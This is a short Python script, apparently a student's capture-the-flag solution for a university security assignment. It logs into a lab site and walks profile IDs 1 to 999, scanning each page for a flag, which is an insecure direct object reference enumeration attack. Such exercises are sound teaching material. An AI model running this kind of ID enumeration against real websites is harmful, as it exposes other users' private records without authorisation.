import requests

session = None


def main():
    for i in range(1, 1000):
        url = f"http://assignment-zeus.unimelb.life/profile.php?id={i}"
        res = session.get(url)

        if "flag{" in res.text.lower():
            print(i, res.text)
            break
        else:
            print(i)

    # 333

if __name__ == "__main__":

    unimelb_username = "xiandew"
    session = requests.Session()
    res = session.post(
        "http://assignment-zeus.unimelb.life/auth.php",
        {
            "user": unimelb_username,
            "pass": unimelb_username
        }
    )

    if res.status_code == 200:
        print(
            f"Login to http://assignment-zeus.unimelb.life/ as {unimelb_username}")
        main()
    else:
        print("Login failed")
